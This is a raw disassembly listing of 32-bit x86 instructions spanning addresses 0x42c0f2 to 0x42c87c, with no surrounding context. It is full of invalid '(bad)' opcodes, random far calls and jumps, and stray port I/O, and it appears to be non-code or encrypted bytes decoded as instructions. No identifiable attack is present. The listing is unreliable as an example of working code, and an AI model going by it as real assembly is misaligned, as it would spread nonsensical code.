  42c0f2:	mov    bl,BYTE PTR [edi+eiz*1+0x7e060925]
  42c0f9:	or     bh,bl
  42c0fb:	stc    
  42c0fc:	into   
  42c0fd:	out    0xeb,eax
  42c0ff:	lods   al,BYTE PTR ds:[esi]
  42c100:	mov    ebp,0x7ea528d4
  42c105:	ret    0x47ec
  42c108:	xchg   ecx,eax
  42c109:	mov    edi,0x5c2ca4ef
  42c10e:	pop    ds
  42c10f:	xor    bh,BYTE PTR [esi+0x1bfc6a34]
  42c115:	call   FWORD PTR [edx-0x3130fc28]
  42c11b:	jge    0x42c151
  42c11d:	jno    0x42c16e
  42c11f:	pop    edi
  42c120:	jl     0x42c12d
  42c122:	in     al,dx
  42c123:	jmp    0x42c13b
  42c125:	sahf   
  42c126:	int    0xe7
  42c128:	and    eax,0xad29a6cd
  42c12d:	jne    0x42c0c9
  42c12f:	mov    bl,0xc0
  42c131:	jl     0x42c0e5
  42c133:	(bad)  
  42c134:	cli    
  42c135:	dec    ecx
  42c136:	sub    BYTE PTR [ecx+0x1c8af391],0x72
  42c13d:	test   al,0xe
  42c13f:	or     ebx,DWORD PTR [eax+0x2df28671]
  42c145:	sbb    al,0x1a
  42c147:	imul   DWORD PTR [esi+0x2b208e12]
  42c14d:	or     ecx,DWORD PTR [eax+0x21]
  42c150:	dec    esp
  42c151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c152:	pop    ebx
  42c153:	test   DWORD PTR [edi+0x31f9adb],eax
  42c159:	add    edx,DWORD PTR [edi+ebp*1+0x4a]
  42c15d:	sar    DWORD PTR [ebx-0x425cae5e],1
  42c163:	sbb    ah,BYTE PTR [eax-0x56de8675]
  42c169:	add    eax,0x8c5a309b
  42c16e:	js     0x42c182
  42c170:	(bad)  
  42c171:	mov    BYTE PTR [edx+0x27],ah
  42c174:	add    ecx,DWORD PTR [ebx]
  42c176:	inc    ebx
  42c177:	out    dx,al
  42c178:	outs   dx,BYTE PTR ds:[esi]
  42c179:	mov    ah,0xc8
  42c17b:	aaa    
  42c17c:	sub    DWORD PTR ds:0x86595a9b,ebx
  42c182:	lods   al,BYTE PTR ds:[esi]
  42c183:	gs push esp
  42c185:	mov    bl,0x66
  42c187:	inc    ebp
  42c188:	sbb    BYTE PTR [ebx],cl
  42c18a:	dec    ebp
  42c18b:	pusha  
  42c18c:	clc    
  42c18d:	rol    bl,0xf5
  42c190:	cmp    dh,BYTE PTR [edi-0x6fa21e7b]
  42c196:	pop    edx
  42c197:	mov    dh,0xee
  42c199:	jbe    0x42c1a6
  42c19b:	mov    esi,cs
  42c19d:	or     ebp,ecx
  42c19f:	iret   
  42c1a0:	retf   
  42c1a1:	dec    edx
  42c1a2:	inc    ebp
  42c1a3:	setae  BYTE PTR [edi+0x2e70cd9d]
  42c1aa:	mov    al,ds:0x43c5324d
  42c1af:	stos   DWORD PTR es:[edi],eax
  42c1b0:	push   cs
  42c1b1:	or     esp,DWORD PTR [ebx+0x23]
  42c1b4:	mov    WORD PTR [ebx+0x18],ds
  42c1b7:	xchg   BYTE PTR [ecx-0x74],cl
  42c1ba:	call   0xcd3e:0xa8c25d0a
  42c1c1:	push   ebp
  42c1c2:	inc    ecx
  42c1c3:	scas   al,BYTE PTR es:[edi]
  42c1c4:	sub    eax,0x327143e2
  42c1c9:	sahf   
  42c1ca:	push   ds
  42c1cb:	sub    BYTE PTR [ecx+edx*2-0x5b77111a],bl
  42c1d2:	cmp    ah,BYTE PTR [edi]
  42c1d4:	sub    esi,DWORD PTR [esi-0xe]
  42c1d7:	adc    ah,ch
  42c1d9:	inc    esi
  42c1da:	fwait
  42c1db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c1dc:	add    dh,BYTE PTR [edx-0x26]
  42c1df:	clc    
  42c1e0:	push   ebx
  42c1e1:	loop   0x42c16b
  42c1e3:	lods   eax,DWORD PTR gs:[esi]
  42c1e5:	(bad)  
  42c1e6:	outs   dx,DWORD PTR ds:[esi]
  42c1e7:	cmp    al,0x72
  42c1e9:	ror    DWORD PTR [ebx-0x5914dd76],cl
  42c1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c1f0:	retf   
  42c1f1:	fnstenv [eax-0x17]
  42c1f4:	leave  
  42c1f5:	cmp    al,0xdb
  42c1f7:	cs mov ebp,0xe99e947d
  42c1fd:	gs jmp 0x624c:0x6b025246
  42c205:	mov    BYTE PTR [eax-0x6db9e359],ch
  42c20b:	jg     0x42c1ba
  42c20d:	cmp    bh,BYTE PTR [esi]
  42c20f:	js     0x42c1c3
  42c211:	xchg   ecx,eax
  42c212:	lea    ebx,[edi+0x32]
  42c215:	and    eax,0xa649c11
  42c21a:	fnsave [esi+0x1d96e56]
  42c220:	ds repz scas eax,DWORD PTR es:[edi]
  42c223:	cmc    
  42c224:	scas   al,BYTE PTR es:[edi]
  42c225:	or     al,0x3b
  42c227:	outs   dx,DWORD PTR ds:[esi]
  42c228:	repnz push ebp
  42c22a:	aaa    
  42c22b:	fild   DWORD PTR [ebx]
  42c22d:	and    ebx,DWORD PTR [ecx-0x59]
  42c230:	xchg   edx,eax
  42c231:	inc    esp
  42c232:	(bad)  
  42c233:	mov    ch,0x78
  42c235:	les    ebp,FWORD PTR [edx-0x6531fdfb]
  42c23b:	mov    WORD PTR [edx-0x15],cs
  42c23e:	lea    ebx,[edi-0x5808af4b]
  42c244:	dec    ecx
  42c245:	dec    edx
  42c246:	inc    edi
  42c247:	into   
  42c248:	test   al,0xbf
  42c24a:	xor    WORD PTR [edx-0x15f3f192],0xb91e
  42c253:	and    al,0x1
  42c255:	adc    eax,0xa386fcd
  42c25a:	push   ds
  42c25b:	jns    0x42c2cd
  42c25d:	cwde   
  42c25e:	popf   
  42c25f:	pop    ebx
  42c260:	jge    0x42c295
  42c262:	call   0xc45f:0xb4be975
  42c269:	jl     0x42c238
  42c26b:	cwde   
  42c26c:	pop    ebp
  42c26d:	inc    eax
  42c26e:	call   0x8c1:0x45242032
  42c275:	fldcw  WORD PTR [eax-0x41]
  42c278:	mov    dl,0xc5
  42c27a:	mov    eax,DWORD PTR [edi]
  42c27c:	mov    ch,BYTE PTR [edi]
  42c27e:	lods   al,BYTE PTR ds:[esi]
  42c27f:	sbb    al,0x46
  42c281:	or     eax,DWORD PTR [eax+0x2a]
  42c284:	cmp    dh,BYTE PTR [esi+0xd]
  42c287:	push   edi
  42c288:	call   0x98985d0b
  42c28d:	pop    edi
  42c28e:	mov    ch,0x49
  42c290:	jnp    0x42c232
  42c292:	pop    ecx
  42c293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c294:	jg     0x42c313
  42c296:	lods   al,BYTE PTR ds:[esi]
  42c297:	cmp    bh,ch
  42c299:	sbb    BYTE PTR [edx+0x3e],0x50
  42c29d:	and    BYTE PTR [edx+0x5503ccad],bl
  42c2a3:	jmp    0x22a6:0xb8f06ad4
  42c2aa:	packuswb mm3,QWORD PTR [ebp+0x13495d52]
  42c2b1:	in     eax,dx
  42c2b2:	stos   BYTE PTR es:[edi],al
  42c2b3:	in     eax,dx
  42c2b4:	out    dx,al
  42c2b5:	jmp    0x42c2ff
  42c2b7:	imul   edx,edx,0xc
  42c2ba:	xchg   esi,eax
  42c2bb:	cli    
  42c2bc:	dec    edx
  42c2bd:	cmp    BYTE PTR [edi+0x3e23d367],ch
  42c2c3:	push   esi
  42c2c4:	xchg   esi,eax
  42c2c5:	sub    eax,0x7cbcc044
  42c2ca:	inc    edx
  42c2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2cc:	popf   
  42c2cd:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c2cf:	push   0xffffffec
  42c2d1:	push   edi
  42c2d2:	jbe    0x42c2bf
  42c2d4:	mov    es,edx
  42c2d6:	sbb    cl,BYTE PTR ds:0xd0bec18e
  42c2dc:	add    al,0x9e
  42c2de:	call   0xec34:0x5675c743
  42c2e5:	xor    BYTE PTR ds:0x26cab4a4,dh
  42c2eb:	xchg   ebp,eax
  42c2ec:	lods   eax,DWORD PTR ds:[esi]
  42c2ed:	push   ebx
  42c2ee:	dec    edx
  42c2ef:	scas   al,BYTE PTR es:[edi]
  42c2f0:	out    0x93,al
  42c2f2:	call   0xf930:0xbc3c9ffe
  42c2f9:	lods   eax,DWORD PTR ds:[esi]
  42c2fa:	das    
  42c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2fc:	loope  0x42c325
  42c2fe:	push   edx
  42c2ff:	pop    ebp
  42c300:	and    esi,DWORD PTR [ebx-0x344d4ea5]
  42c306:	jge    0x42c2c3
  42c308:	inc    edi
  42c309:	ins    DWORD PTR es:[edi],dx
  42c30a:	div    BYTE PTR [ebp+0x4]
  42c30d:	or     al,0x8
  42c30f:	sbb    BYTE PTR [ebp-0x59],bl
  42c312:	xchg   esi,eax
  42c313:	mov    bh,0x37
  42c315:	dec    esp
  42c316:	xor    al,0xf
  42c318:	mov    dl,0xe
  42c31a:	xlat   BYTE PTR ds:[ebx]
  42c31b:	fimul  WORD PTR [ebp+0x48]
  42c31e:	sahf   
  42c31f:	sub    BYTE PTR [eax+0xa38470b],bh
  42c325:	or     DWORD PTR [eax],esp
  42c327:	mov    al,ds:0xdb9a3195
  42c32c:	fdiv   DWORD PTR [esi-0x6a]
  42c32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c330:	inc    edx
  42c331:	jg     0x42c334
  42c333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c334:	imul   edx,DWORD PTR [edi],0xffffffe9
  42c337:	test   ecx,0xcde1decf
  42c33d:	pop    esi
  42c33e:	call   0x2e7d:0xa3fddeff
  42c345:	mov    dh,0x5a
  42c347:	mov    eax,esi
  42c349:	sub    al,BYTE PTR [ecx]
  42c34b:	mov    ecx,0xac184bf7
  42c350:	fbstp  TBYTE PTR [eax]
  42c352:	aaa    
  42c353:	push   edi
  42c354:	mov    dl,0x38
  42c356:	xor    eax,ebp
  42c358:	sub    dl,BYTE PTR [ebp+0xba3a5b7]
  42c35e:	push   edx
  42c35f:	fisubr WORD PTR [edi+0x51173828]
  42c365:	stos   BYTE PTR es:[edi],al
  42c366:	call   0xd74e:0xf44c19cd
  42c36d:	sub    DWORD PTR [edi-0x6df64259],ecx
  42c373:	mov    ebx,0x59e40f57
  42c378:	mov    dl,0x32
  42c37a:	pop    esi
  42c37b:	(bad)  
  42c37d:	arpl   WORD PTR [ecx+0x130b1447],bp
  42c383:	jmp    ecx
  42c385:	sbb    BYTE PTR [ebp-0x6562f9e0],ah
  42c38b:	imul   ebp
  42c38d:	pop    ds
  42c38e:	inc    edi
  42c38f:	inc    esp
  42c390:	(bad)  
  42c393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c394:	jae    0x42c382
  42c396:	xchg   ecx,eax
  42c397:	and    eax,0xcee9b217
  42c39c:	mov    dl,0x2e
  42c39e:	mov    eax,0x39421e67
  42c3a3:	mov    bl,0xc5
  42c3a5:	movntps XMMWORD PTR [esi+ebp*4],xmm4
  42c3a9:	mov    eax,ds:0xe3db6785
  42c3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3af:	outs   dx,DWORD PTR ds:[esi]
  42c3b0:	dec    eax
  42c3b1:	sbb    esp,eax
  42c3b3:	shl    DWORD PTR [edx-0x228a8cf6],1
  42c3b9:	mov    fs,edx
  42c3bb:	add    esp,ecx
  42c3bd:	or     eax,eax
  42c3bf:	neg    DWORD PTR [ebx-0x771d4091]
  42c3c5:	mov    al,ds:0x8673869b
  42c3ca:	shl    BYTE PTR [ebx-0x25],cl
  42c3cd:	jle    0x42c3c9
  42c3cf:	cmp    DWORD PTR [esi+0xb],edi
  42c3d2:	hlt    
  42c3d3:	push   0xffffff8c
  42c3d5:	mov    ebp,0x60040d6
  42c3da:	call   0x4cc4:0x792270e1
  42c3e1:	test   BYTE PTR [ecx],ah
  42c3e3:	mov    edx,0x27800d72
  42c3e8:	popa   
  42c3e9:	sub    ebp,DWORD PTR [edi-0x664c8e31]
  42c3ef:	pop    esp
  42c3f0:	xor    ebp,DWORD PTR [ebp-0x246ee2a5]
  42c3f6:	xchg   esp,eax
  42c3f7:	in     eax,dx
  42c3f8:	fsub   DWORD PTR ds:0x8aeb88b
  42c3fe:	ret    
  42c3ff:	(bad)  
  42c400:	bound  esp,QWORD PTR [edi]
  42c402:	and    dl,BYTE PTR [eax-0x42]
  42c405:	sbb    eax,0x820239a
  42c40a:	retf   
  42c40b:	into   
  42c40c:	push   esi
  42c40d:	pushf  
  42c40e:	ds mov cl,0xce
  42c411:	sbb    esi,ebp
  42c413:	pop    ds
  42c414:	mov    esi,0xb9a06a0b
  42c419:	or     eax,0x4042a97
  42c41e:	fisub  WORD PTR [edx]
  42c420:	or     eax,0x104c1ac9
  42c425:	ror    DWORD PTR [ebx+edi*8-0x1b08174e],0x1f
  42c42d:	and    eax,0x1514fc90
  42c432:	xlat   BYTE PTR ds:[ebx]
  42c433:	in     eax,0x26
  42c435:	or     ebp,DWORD PTR [edx-0x572afc8e]
  42c43b:	jo     0x42c3f0
  42c43d:	repz in al,0x13
  42c440:	mov    dh,0x9b
  42c442:	rcl    BYTE PTR [eax],cl
  42c444:	push   0xfffffff6
  42c446:	pop    esp
  42c447:	pop    ss
  42c448:	test   BYTE PTR [edx],0x15
  42c44b:	icebp  
  42c44c:	mov    ebp,0x80f52862
  42c451:	call   FWORD PTR [ecx]
  42c453:	int    0xb2
  42c455:	call   0x7142:0x11ac16df
  42c45c:	ror    BYTE PTR [ebx],0x9f
  42c45f:	push   ds
  42c460:	(bad)  
  42c462:	mov    al,0xe
  42c464:	pop    ds
  42c465:	int    0x9a
  42c467:	sbb    al,0xf1
  42c469:	and    al,0x65
  42c46b:	inc    edx
  42c46c:	and    eax,DWORD PTR [ebp+0x5a]
  42c46f:	mov    eax,0x660fa940
  42c474:	hlt    
  42c475:	inc    eax
  42c476:	cs dec edx
  42c478:	mov    eax,0x5eff7bcf
  42c47d:	or     DWORD PTR [edx-0x160dd7b9],ebx
  42c483:	mov    WORD PTR [di-0x5812],fs
  42c488:	or     eax,DWORD PTR [ebp+0x5d]
  42c48b:	pop    ecx
  42c48c:	mov    edx,0xad698bee
  42c491:	ret    0x6ca3
  42c494:	(bad)  
  42c495:	or     ebp,DWORD PTR [edx]
  42c497:	xor    DWORD PTR cs:[esi-0x7b],ebx
  42c49b:	enter  0xbfe,0x9c
  42c49f:	arpl   bp,si
  42c4a1:	loopne 0x42c48d
  42c4a3:	fcom   QWORD PTR [ebx+ebx*8-0x66]
  42c4a7:	push   0xb5f89243
  42c4ac:	or     BYTE PTR [ebx+ebx*8-0x1deca5b3],0xc4
  42c4b4:	mov    ds:0xb22da327,al
  42c4b9:	inc    ecx
  42c4ba:	sub    al,0x82
  42c4bc:	shl    BYTE PTR [edi+0xbd5aeda],cl
  42c4c2:	cld    
  42c4c3:	cmp    al,0x61
  42c4c5:	mov    bh,bl
  42c4c7:	data16 cmc 
  42c4c9:	push   esi
  42c4ca:	fwait
  42c4cb:	mov    cl,0x5c
  42c4cd:	cdq    
  42c4ce:	in     eax,0xd
  42c4d0:	push   eax
  42c4d1:	mov    eax,0x5c71e56
  42c4d6:	xlat   BYTE PTR ds:[ebx]
  42c4d7:	mov    ah,0x7f
  42c4d9:	sar    DWORD PTR [edx-0x63f8a8c3],0xef
  42c4e0:	mov    dl,0x61
  42c4e2:	sub    eax,0x37efbcd4
  42c4e7:	sub    ch,ah
  42c4e9:	pop    ss
  42c4ea:	xchg   ebp,eax
  42c4eb:	and    dl,BYTE PTR [esi]
  42c4ed:	dec    ebx
  42c4ee:	fiadd  WORD PTR [esp+ebx*1+0x50]
  42c4f2:	fistp  DWORD PTR [esi]
  42c4f4:	mov    ch,0x79
  42c4f6:	mov    edx,0xa9565ad
  42c4fb:	mov    fs,ebx
  42c4fd:	leave  
  42c4fe:	into   
  42c4ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c500:	js     0x42c4bd
  42c502:	ins    BYTE PTR es:[edi],dx
  42c503:	fnstsw WORD PTR [edx+0x6f]
  42c506:	jl     0x42c52e
  42c508:	mov    ds,WORD PTR [ebx+0x3d01a720]
  42c50e:	mov    al,ds:0xecd6a22d
  42c513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c514:	cmc    
  42c515:	or     ch,al
  42c517:	jg     0x42c4df
  42c519:	jno    0x42c531
  42c51b:	shl    DWORD PTR [edx+0x1205cb4d],0xeb
  42c522:	das    
  42c523:	imul   esp,esi,0x8da8930b
  42c529:	fwait
  42c52a:	mov    esi,0x9a98ec7e
  42c52f:	(bad)  
  42c530:	pop    ecx
  42c531:	lea    ecx,[edi-0x3d9c7a2b]
  42c537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c538:	out    0x1b,eax
  42c53a:	adc    bl,dh
  42c53c:	cmp    cl,BYTE PTR [ebx+eax*8+0x41]
  42c540:	mov    dl,0x3a
  42c542:	mov    WORD PTR [eax],?
  42c544:	fdiv   st,st(0)
  42c546:	add    al,dh
  42c548:	inc    ebx
  42c549:	add    BYTE PTR [ecx],ah
  42c54b:	in     eax,dx
  42c54c:	arpl   WORD PTR [eax+0x1a],bp
  42c54f:	push   cs
  42c550:	add    ebx,DWORD PTR [esi-0x754d3070]
  42c556:	lahf   
  42c557:	enter  0x5096,0x6c
  42c55b:	mov    dl,0xf1
  42c55d:	adc    eax,0xbdb0bd2
  42c562:	cli    
  42c563:	and    edx,DWORD PTR [esi]
  42c565:	in     eax,0x4b
  42c567:	mov    ebp,0x829ad844
  42c56c:	cmc    
  42c56d:	jp     0x42c5c8
  42c56f:	push   0xa906ba07
  42c574:	leave  
  42c575:	add    al,0x8c
  42c577:	ror    DWORD PTR [esi-0x720d8e35],0x9a
  42c57e:	je     0x42c502
  42c580:	mov    dl,0x8e
  42c582:	mov    bl,0xe8
  42c584:	icebp  
  42c585:	mov    eax,ds:0xbb6b53d
  42c58a:	addr16 push ds
  42c58c:	pop    ss
  42c58d:	retf   
  42c58e:	lds    esi,FWORD PTR [edx+0x5c9a4b95]
  42c594:	and    DWORD PTR [edx],ecx
  42c596:	xchg   edi,eax
  42c597:	pop    eax
  42c598:	mov    ch,0x66
  42c59a:	dec    DWORD PTR [ecx-0x588782d4]
  42c5a0:	jmp    FWORD PTR [bx+di-0x6b]
  42c5a4:	lock sub eax,0x51e4bc9a
  42c5aa:	push   ebp
  42c5ab:	je     0x42c592
  42c5ad:	and    eax,0xe7955fd4
  42c5b2:	sbb    BYTE PTR [ecx-0x4de2fa67],bl
  42c5b8:	ins    BYTE PTR es:[edi],dx
  42c5b9:	inc    ebx
  42c5ba:	cdq    
  42c5bb:	daa    
  42c5bc:	outs   dx,BYTE PTR ds:[esi]
  42c5bd:	push   es
  42c5be:	mov    dh,0xe6
  42c5c0:	mov    bl,0xf9
  42c5c2:	mov    ds:0xf571193c,al
  42c5c7:	mov    esi,0xa7748142
  42c5cc:	ret    
  42c5cd:	call   0x8b929d17
  42c5d2:	and    BYTE PTR [ecx+0xb7d9fb0],bh
  42c5d8:	sub    eax,0x87479b69
  42c5dd:	add    DWORD PTR gs:[edi+0xc3ee614],esp
  42c5e4:	test   BYTE PTR [eax],0xc8
  42c5e7:	lods   eax,DWORD PTR cs:[esi]
  42c5e9:	loop   0x42c651
  42c5eb:	push   ebx
  42c5ec:	repnz inc ebp
  42c5ee:	dec    edx
  42c5ef:	sbb    edi,DWORD PTR [edi]
  42c5f1:	pop    ebx
  42c5f2:	push   es
  42c5f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5f4:	les    esp,FWORD PTR [esp+edi*8-0x38aac3ca]
  42c5fb:	sar    DWORD PTR [ebp+0x79718a9e],cl
  42c601:	sub    edx,DWORD PTR [edx+edx*8-0x10d512f1]
  42c608:	dec    DWORD PTR [ecx-0x66]
  42c60b:	and    DWORD PTR [eax+0x57e91788],edx
  42c611:	push   ds
  42c612:	in     eax,dx
  42c613:	jg     0x42c5c7
  42c615:	add    BYTE PTR [ecx-0x4c3b81e4],bl
  42c61b:	mov    al,0x5e
  42c61d:	or     esi,DWORD PTR [esi]
  42c61f:	inc    esi
  42c620:	xchg   edx,eax
  42c621:	mov    WORD PTR ss:[edx-0x2c661340],gs
  42c628:	out    0x2f,eax
  42c62a:	aam    0xcc
  42c62c:	pop    ds
  42c62d:	rcl    DWORD PTR [eax],cl
  42c62f:	inc    ebx
  42c630:	stc    
  42c631:	mov    ebx,0xb7ccbb8f
  42c636:	(bad)  
  42c637:	out    0x4,eax
  42c639:	inc    ecx
  42c63a:	popa   
  42c63b:	pop    ss
  42c63c:	cmp    al,0xa0
  42c63e:	call   0xc49:0x253e4ab9
  42c645:	data16 xor BYTE PTR [edi-0x40f2e20d],ah
  42c64c:	rcl    BYTE PTR [ebp+ebp*8-0x79],cl
  42c650:	mov    dl,0x2d
  42c652:	mov    ebp,0xde9857c4
  42c657:	scas   al,BYTE PTR es:[edi]
  42c658:	cmp    DWORD PTR [ebx],ecx
  42c65a:	pop    ds
  42c65b:	pop    esi
  42c65c:	test   BYTE PTR [ebx+0x79df8ce2],ah
  42c662:	mov    ah,0x8a
  42c664:	mov    esi,0xb8e19ac1
  42c669:	out    0x64,eax
  42c66b:	xchg   edx,eax
  42c66c:	repz or edi,DWORD PTR [edi+esi*2-0x612da4ac]
  42c674:	int    0xe2
  42c676:	fwait
  42c677:	pop    edx
  42c678:	mov    ebp,0x63fecbd7
  42c67d:	sbb    al,0x4a
  42c67f:	mov    cl,0x3
  42c681:	or     esp,DWORD PTR [ebx+edx*4-0x7]
  42c685:	xchg   esp,eax
  42c686:	scas   eax,DWORD PTR es:[edi]
  42c687:	shl    DWORD PTR [esi-0x14],0x9b
  42c68b:	xchg   BYTE PTR [ebx],bh
  42c68d:	imul   ecx,DWORD PTR [ecx],0x54
  42c690:	lds    esi,FWORD PTR [edx]
  42c692:	dec    dx
  42c694:	repnz or ebx,esp
  42c697:	pop    es
  42c698:	add    al,0xc5
  42c69a:	stos   DWORD PTR es:[edi],eax
  42c69b:	sub    ebx,esi
  42c69d:	pusha  
  42c69e:	jb     0x42c653
  42c6a0:	mov    dl,0x6a
  42c6a2:	push   ebx
  42c6a3:	mov    WORD PTR [ebp+0x2b8f23ba],gs
  42c6a9:	or     al,0x63
  42c6ab:	sbb    al,0xe6
  42c6ad:	dec    eax
  42c6ae:	movntq QWORD PTR [esi+eax*8+0x24b2c2f5],mm4
  42c6b6:	cli    
  42c6b7:	aaa    
  42c6b8:	push   eax
  42c6b9:	call   0xc2f64d4
  42c6be:	inc    eax
  42c6bf:	ss mov ebx,0x81af68fd
  42c6c5:	test   eax,0x28868195
  42c6ca:	xor    DWORD PTR [ecx],edi
  42c6cc:	and    ebp,ecx
  42c6ce:	call   0xe9fb:0x42e936e8
  42c6d5:	or     ebp,DWORD PTR [ecx]
  42c6d7:	adc    BYTE PTR [ecx],cl
  42c6d9:	mov    esi,0xe09644e4
  42c6de:	sub    al,BYTE PTR [eax]
  42c6e0:	mov    dl,0xc0
  42c6e2:	cmp    DWORD PTR [edx+0x7b],esi
  42c6e5:	fcmovb st,st(4)
  42c6e7:	je     0x42c731
  42c6e9:	or     al,0xf8
  42c6eb:	ins    DWORD PTR es:[edi],dx
  42c6ec:	imul   esi
  42c6ee:	in     eax,dx
  42c6ef:	inc    edi
  42c6f0:	or     BYTE PTR [edi+0x9],dl
  42c6f3:	push   esi
  42c6f4:	mov    dl,0x7b
  42c6f6:	dec    ebp
  42c6f7:	mul    DWORD PTR [ebx]
  42c6f9:	push   ss
  42c6fa:	sub    BYTE PTR [edx],ch
  42c6fc:	sub    BYTE PTR [ebx],cl
  42c6fe:	xchg   edi,eax
  42c6ff:	out    0xd4,eax
  42c701:	leave  
  42c702:	mov    DWORD PTR [edx+0x8],esi
  42c705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c706:	call   0x98d7:0x6000c5d4
  42c70d:	aam    0x84
  42c70f:	fwait
  42c710:	sub    edx,esi
  42c712:	loopne 0x42c6cd
  42c714:	inc    ecx
  42c715:	test   BYTE PTR [esi+0x17771527],cl
  42c71b:	rcr    esp,1
  42c71d:	mov    dl,0x9a
  42c71f:	scas   al,BYTE PTR es:[edi]
  42c720:	and    DWORD PTR [ebx+ecx*2],esp
  42c723:	lods   eax,DWORD PTR ds:[esi]
  42c724:	stos   DWORD PTR es:[edi],eax
  42c725:	jo     0x42c6e3
  42c727:	mov    al,ds:0xc3548a6a
  42c72c:	add    BYTE PTR [ebx],ch
  42c72e:	leave  
  42c72f:	sbb    dh,bh
  42c731:	out    0x86,eax
  42c733:	sub    dl,BYTE PTR [edi+0x29f79a20]
  42c739:	sub    eax,0xe9d26684
  42c73e:	ins    BYTE PTR es:[edi],dx
  42c73f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c740:	dec    ebx
  42c741:	call   0xbd71cf0c
  42c746:	leave  
  42c747:	out    dx,al
  42c748:	scas   eax,DWORD PTR es:[edi]
  42c749:	add    al,0x89
  42c74b:	and    dh,BYTE PTR [edx+0x57b3f4b1]
  42c751:	stos   BYTE PTR es:[edi],al
  42c752:	mov    eax,0xc8b71ca9
  42c757:	xor    DWORD PTR [edx+0xd62a8fd],0xca979a4b
  42c761:	xchg   ebx,eax
  42c762:	push   edx
  42c763:	(bad)  
  42c764:	lods   al,BYTE PTR ds:[esi]
  42c765:	scas   al,BYTE PTR es:[edi]
  42c766:	push   ss
  42c767:	dec    edi
  42c768:	mov    bl,0x7f
  42c76a:	mov    al,0xa7
  42c76c:	stc    
  42c76d:	dec    esi
  42c76e:	into   
  42c76f:	mov    al,ds:0x194636dd
  42c774:	mov    dl,0xe
  42c776:	js     0x42c702
  42c778:	rcr    BYTE PTR [edx+ebp*8+0x2b0abf6f],cl
  42c77f:	ja     0x42c70f
  42c781:	dec    ecx
  42c782:	test   eax,ebx
  42c784:	jmp    0x751f:0xb26ef9d3
  42c78b:	mov    dh,0x1
  42c78d:	and    esp,eax
  42c78f:	add    DWORD PTR ds:0x28c54f0b,ecx
  42c795:	mov    ebp,0xb2979c82
  42c79a:	call   0xedfa:0xb8451ab4
  42c7a1:	dec    esi
  42c7a2:	imul   esp,DWORD PTR [edi-0x3b0e4e03],0x931a285b
  42c7ac:	mov    cl,0x20
  42c7ae:	mov    BYTE PTR [esp+eax*4-0x27b3e7a3],ch
  42c7b5:	stos   DWORD PTR es:[edi],eax
  42c7b6:	push   ss
  42c7b7:	push   ss
  42c7b8:	pusha  
  42c7b9:	or     ebx,DWORD PTR [ebx-0x57]
  42c7bc:	scas   eax,DWORD PTR es:[edi]
  42c7bd:	inc    ebp
  42c7be:	jl     0x42c78c
  42c7c0:	arpl   WORD PTR [esp+ecx*4-0x64ee3721],ax
  42c7c7:	add    DWORD PTR [ebx-0x42],edx
  42c7ca:	ins    DWORD PTR es:[edi],dx
  42c7cb:	jns    0x42c847
  42c7cd:	push   edi
  42c7ce:	lea    esp,[ebx+0x68bc1b03]
  42c7d4:	(bad)  [edx-0x28a6d17e]
  42c7da:	push   0x9ce6b9b5
  42c7df:	add    BYTE PTR [eax*4-0x5477b836],cl
  42c7e6:	sub    eax,0x7d160de6
  42c7eb:	dec    edi
  42c7ec:	xor    al,0x4b
  42c7ee:	cmp    bl,cl
  42c7f0:	xor    dh,bl
  42c7f2:	xor    eax,ebp
  42c7f4:	mov    dl,0x38
  42c7f6:	add    bl,bh
  42c7f8:	lock cmovg ebx,DWORD PTR [ebx-0x7c]
  42c7fd:	xor    eax,0xbc223da
  42c802:	jmp    0x42c82a
  42c804:	fild   WORD PTR [ebx-0x4f]
  42c807:	fcmovu st,st(0)
  42c809:	and    al,BYTE PTR [esi+eiz*8-0x7e2506d3]
  42c810:	or     al,0xed
  42c812:	adc    dh,BYTE PTR [ecx]
  42c814:	int    0x33
  42c816:	ret    
  42c817:	lds    esi,FWORD PTR [esi+0x6a9c2e91]
  42c81d:	mov    edx,esp
  42c81f:	jo     0x42c880
  42c821:	add    al,0x25
  42c823:	(bad)  
  42c824:	data16 jb 0x42c89d
  42c827:	push   edx
  42c828:	jb     0x42c835
  42c82a:	mov    ebp,DWORD PTR [edx-0x4c85bf45]
  42c830:	jns    0x42c891
  42c832:	call   0x4da6:0x48f2f694
  42c839:	mov    cl,0x8
  42c83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c83c:	out    dx,eax
  42c83d:	cs cwde 
  42c83f:	imul   eax,edx,0xffffffa7
  42c842:	or     al,0x79
  42c844:	mov    esp,0xc7f15137
  42c849:	xchg   ebp,eax
  42c84a:	sbb    cl,BYTE PTR [edi]
  42c84c:	ss push edi
  42c84e:	adc    eax,0x4ceb0617
  42c853:	dec    eax
  42c855:	pop    ecx
  42c856:	call   0x5625:0x44c95e0a
  42c85d:	mov    eax,0x324ad59a
  42c862:	outs   dx,DWORD PTR ds:[esi]
  42c863:	out    dx,al
  42c864:	int    0x9e
  42c866:	inc    ecx
  42c867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c868:	in     eax,dx
  42c869:	loop   0x42c8a3
  42c86b:	sbb    eax,0xe1d80a15
  42c870:	lods   al,BYTE PTR ds:[esi]
  42c871:	mov    ch,0xbd
  42c873:	adc    dl,dh
  42c875:	hlt    
  42c876:	test   BYTE PTR [esi],al
  42c878:	xchg   esi,eax
  42c879:	out    0x19,eax
  42c87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c87c:	and    eax,0x3c72ab58
